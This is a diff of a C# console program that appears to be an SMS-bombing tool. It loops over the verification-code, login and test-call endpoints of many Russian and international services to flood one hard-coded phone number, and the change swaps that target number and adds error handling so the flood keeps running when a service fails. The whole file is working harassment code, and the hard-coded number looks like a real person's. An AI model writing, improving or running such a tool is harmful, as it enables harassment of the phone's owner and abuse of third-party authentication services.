@@ -9,7 +9,7 @@ namespace test
 {
     class MainClass
     {
-        static string basePhone = "9029885784"; //without country code
+        static string basePhone = "9190307566"; //without country code
         static int amount = 1;
 
         static int aDelay60s = 5, aDelay30s = 1, aDelay20s = 3;
@@ -50,9 +50,17 @@ namespace test
         public static void ShowAnswer(WebRequest request)
         {
             var response = (HttpWebResponse)request.GetResponse();
-            using (var streamReader = new StreamReader(response.GetResponseStream()))
+            if (response.StatusCode == HttpStatusCode.OK)
             {
-                var result = streamReader.ReadToEnd(); Console.WriteLine(result);
+                using (var streamReader = new StreamReader(response.GetResponseStream()))
+                {
+                    var result = streamReader.ReadToEnd(); Console.WriteLine(result);
+                }
+            }
+            else
+
+            {
+                Console.WriteLine($"Ошибка! {response.Server}  {response.StatusCode}");
             }
         }
 
@@ -95,6 +103,7 @@ namespace test
             for (int i = 0; i < amount; ++i)
             {
                 Console.WriteLine(" ===== 60s delay =====");
+
                 yandexTaxi.SendYaTaxiPOST();
                 karusel.SendKaruselPOST();
                 belkaCar.SendBelkaCarPOST();
@@ -136,8 +145,8 @@ namespace test
 
             public void GetYaTaxiCode()
             {
-
                 HttpWebRequest request = (HttpWebRequest)WebRequest.Create("https://taxi.yandex.ru/#auth");
+
                 HttpWebResponse response = (HttpWebResponse)request.GetResponse();
                 if (response.StatusCode == HttpStatusCode.OK)
                 {
@@ -163,21 +172,28 @@ namespace test
 
             public void SendYaTaxiPOST()
             {
-                GetYaTaxiCode();
-
-                HttpWebRequest request = (HttpWebRequest)WebRequest.Create("https://taxi.yandex.ru/3.0/auth");
-                request.ContentType = "application/json";
-                request.Method = "POST";
-
-                using (var streamWriter = new StreamWriter(request.GetRequestStream()))
+                try
                 {
-                    string json = "{\"id\":\"" + id + "\"," +
-                                  "\"phone\":\"" + phone + "\"}";
+                    GetYaTaxiCode();
 
-                    streamWriter.Write(json);
+                    HttpWebRequest request = (HttpWebRequest)WebRequest.Create("https://taxi.yandex.ru/3.0/auth");
+                    request.ContentType = "application/json";
+                    request.Method = "POST";
+
+                    using (var streamWriter = new StreamWriter(request.GetRequestStream()))
+                    {
+                        string json = "{\"id\":\"" + id + "\"," +
+                                      "\"phone\":\"" + phone + "\"}";
+
+                        streamWriter.Write(json);
+                    }
+
+                    ShowAnswer(request);
                 }
-
-                ShowAnswer(request);
+                catch (WebException e)
+                {
+                    Console.WriteLine("Error! YaTaxi: " + e.Message);
+                }
             }
 
             private static string phone, id;
@@ -192,18 +208,25 @@ namespace test
 
             public void SendTinderPOST()
             {
-                HttpWebRequest request = (HttpWebRequest)WebRequest.Create("https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=en");
-                request.ContentType = "application/json";
-                request.Method = "POST";
-
-                using (var streamWriter = new StreamWriter(request.GetRequestStream()))
+                try
                 {
-                    string json = "{\"phone_number\":\"" + phone + "\"}";
+                    HttpWebRequest request = (HttpWebRequest)WebRequest.Create("https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=en");
+                    request.ContentType = "application/json";
+                    request.Method = "POST";
 
-                    streamWriter.Write(json);
+                    using (var streamWriter = new StreamWriter(request.GetRequestStream()))
+                    {
+                        string json = "{\"phone_number\":\"" + phone + "\"}";
+
+                        streamWriter.Write(json);
+                    }
+
+                    ShowAnswer(request);
                 }
-
-                ShowAnswer(request);
+                catch (WebException e)
+                {
+                    Console.WriteLine("Error! Tinder: " + e.Message);
+                }
             }
 
             private static string phone;
@@ -218,18 +241,25 @@ namespace test
 
             public void SendYoulaPOST()
             {
-                HttpWebRequest request = (HttpWebRequest)WebRequest.Create("https://youla.ru/web-api/auth/request_code");
-                request.ContentType = "application/json";
-                request.Method = "POST";
-
-                using (var streamWriter = new StreamWriter(request.GetRequestStream()))
+                try
                 {
-                    string json = "{\"phone\":\"" + phone + "\"}";
+                    HttpWebRequest request = (HttpWebRequest)WebRequest.Create("https://youla.ru/web-api/auth/request_code");
+                    request.ContentType = "application/json";
+                    request.Method = "POST";
 
-                    streamWriter.Write(json);
+                    using (var streamWriter = new StreamWriter(request.GetRequestStream()))
+                    {
+                        string json = "{\"phone\":\"" + phone + "\"}";
+
+                        streamWriter.Write(json);
+                    }
+
+                    ShowAnswer(request);
                 }
-
-                ShowAnswer(request);
+                catch (WebException e)
+                {
+                    Console.WriteLine("Error! Youla: " + e.Message);
+                }
             }
 
             private static string phone;
@@ -244,18 +274,27 @@ namespace test
 
             public void SendKaruselPOST()
             {
-                HttpWebRequest request = (HttpWebRequest)WebRequest.Create("https://app.karusel.ru/api/v1/phone/");
-                request.ContentType = "application/json";
-                request.Method = "POST";
-
-                using (var streamWriter = new StreamWriter(request.GetRequestStream()))
+                try
                 {
-                    string json = "{\"phone\":\"" + phone + "\"}";
+                    HttpWebRequest request = (HttpWebRequest)WebRequest.Create("https://app.karusel.ru/api/v1/phone/");
+                    request.ContentType = "application/json";
+                    request.Method = "POST";
 
-                    streamWriter.Write(json);
+                    using (var streamWriter = new StreamWriter(request.GetRequestStream()))
+                    {
+                        string json = "{\"phone\":\"" + phone + "\"}";
+
+                        streamWriter.Write(json);
+                    }
+
+                    ShowAnswer(request);
                 }
 
-                ShowAnswer(request);
+                catch(WebException e)
+                {
+                    Console.WriteLine("Ошибка! Karusel: " + e.Message);
+                }
+
             }
 
             private static string phone;
@@ -270,19 +309,26 @@ namespace test
 
             public void SendBelkaCarPOST()
             {
-                HttpWebRequest request = (HttpWebRequest)WebRequest.Create("https://lk.belkacar.ru/get-confirmation-code");
-                request.ContentType = "application/x-www-form-urlencoded";
-                request.Method = "POST";
-                request.UserAgent = "Mozilla/5.0";
-
-                using (var streamWriter = new StreamWriter(request.GetRequestStream()))
+                try
                 {
-                    string json = "phone=" + phone;
+                    HttpWebRequest request = (HttpWebRequest)WebRequest.Create("https://lk.belkacar.ru/get-confirmation-code");
+                    request.ContentType = "application/x-www-form-urlencoded";
+                    request.Method = "POST";
+                    request.UserAgent = "Mozilla/5.0";
 
-                    streamWriter.Write(json);
+                    using (var streamWriter = new StreamWriter(request.GetRequestStream()))
+                    {
+                        string json = "phone=" + phone;
+
+                        streamWriter.Write(json);
+                    }
+
+                    ShowAnswer(request);
                 }
-
-                ShowAnswer(request);
+                catch (WebException e)
+                {
+                    Console.WriteLine("Error! BelkaCar: " + e.Message);
+                }
             }
 
             private static string phone;
@@ -297,18 +343,26 @@ namespace test
 
             public void SenYaEdaPOST()
             {
-                HttpWebRequest request = (HttpWebRequest)WebRequest.Create("https://eda.yandex/api/v1/user/request_authentication_code");
-                request.ContentType = "application/json";
-                request.Method = "POST";
-
-                using (var streamWriter = new StreamWriter(request.GetRequestStream()))
+                try
                 {
-                    string json = "{\"phone_number\":\"" + phone + "\"}";
 
-                    streamWriter.Write(json);
+                    HttpWebRequest request = (HttpWebRequest)WebRequest.Create("https://eda.yandex/api/v1/user/request_authentication_code");
+                    request.ContentType = "application/json";
+                    request.Method = "POST";
+
+                    using (var streamWriter = new StreamWriter(request.GetRequestStream()))
+                    {
+                        string json = "{\"phone_number\":\"" + phone + "\"}";
+
+                        streamWriter.Write(json);
+                    }
+
+                    ShowAnswer(request);
                 }
-
-                ShowAnswer(request);
+                catch (WebException e)
+                {
+                    Console.WriteLine("Error! YaEda: " + e.Message);
+                }
             }
 
             private static string phone;
@@ -349,22 +403,29 @@ namespace test
 
             public void SendWinkPOST()
             {
-                HttpWebRequest request = (HttpWebRequest)WebRequest.Create("https://cnt-odcv-itv02.svc.iptv.rt.ru/api/v2/portal/send_sms_code");
-                request.ContentType = "application/json";
-                request.Method = "POST";
-
-                GetWinkSessionID();
-
-                request.Headers.Add("session_id:" + id);
-
-                using (var streamWriter = new StreamWriter(request.GetRequestStream()))
+                try
                 {
-                    string json = "{\"phone\":\"" + phone + "\", \"action\":\"register\"}";
+                    HttpWebRequest request = (HttpWebRequest)WebRequest.Create("https://cnt-odcv-itv02.svc.iptv.rt.ru/api/v2/portal/send_sms_code");
+                    request.ContentType = "application/json";
+                    request.Method = "POST";
 
-                    streamWriter.Write(json);
+                    GetWinkSessionID();
+
+                    request.Headers.Add("session_id:" + id);
+
+                    using (var streamWriter = new StreamWriter(request.GetRequestStream()))
+                    {
+                        string json = "{\"phone\":\"" + phone + "\", \"action\":\"register\"}";
+
+                        streamWriter.Write(json);
+                    }
+
+                    ShowAnswer(request);
                 }
-
-                ShowAnswer(request);
+                catch (WebException e)
+                {
+                    Console.WriteLine("Error! Wink: " + e.Message);
+                }
             }
 
             private static string phone, id;
@@ -379,12 +440,19 @@ namespace test
 
             public void SendFDoctorGET()
             {
-                HttpWebRequest request = (HttpWebRequest)WebRequest.Create("https://my.fdoctor.ru/ajax/auth-simple/send_sms.php?auth-phone=" + phone + "&PHONE=" + phone);
+                try
+                {
+                    HttpWebRequest request = (HttpWebRequest)WebRequest.Create("https://my.fdoctor.ru/ajax/auth-simple/send_sms.php?auth-phone=" + phone + "&PHONE=" + phone);
 
-                request.Method = "GET";
-                request.Headers["X-Requested-With"] = "XMLHttpRequest";
+                    request.Method = "GET";
+                    request.Headers["X-Requested-With"] = "XMLHttpRequest";
 
-                ShowAnswer(request);
+                    ShowAnswer(request);
+                }
+                catch (WebException e)
+                {
+                    Console.WriteLine("Error! FDoctor: " + e.Message);
+                }
             }
 
             private static string phone;
@@ -399,12 +467,19 @@ namespace test
 
             public void SendAvtobzvonGET()
             {
-                HttpWebRequest request = (HttpWebRequest)WebRequest.Create("https://avtobzvon.ru/request/makeTestCall?to=" + phone);
+                try
+                {
+                    HttpWebRequest request = (HttpWebRequest)WebRequest.Create("https://avtobzvon.ru/request/makeTestCall?to=" + phone);
 
-                request.Method = "GET";
-                request.Headers["X-Requested-With"] = "XMLHttpRequest";
+                    request.Method = "GET";
+                    request.Headers["X-Requested-With"] = "XMLHttpRequest";
 
-                ShowAnswer(request);
+                    ShowAnswer(request);
+                }
+                catch (WebException e)
+                {
+                    Console.WriteLine("Error! Avtobzvon: " + e.Message);
+                }
             }
 
             private static string phone;
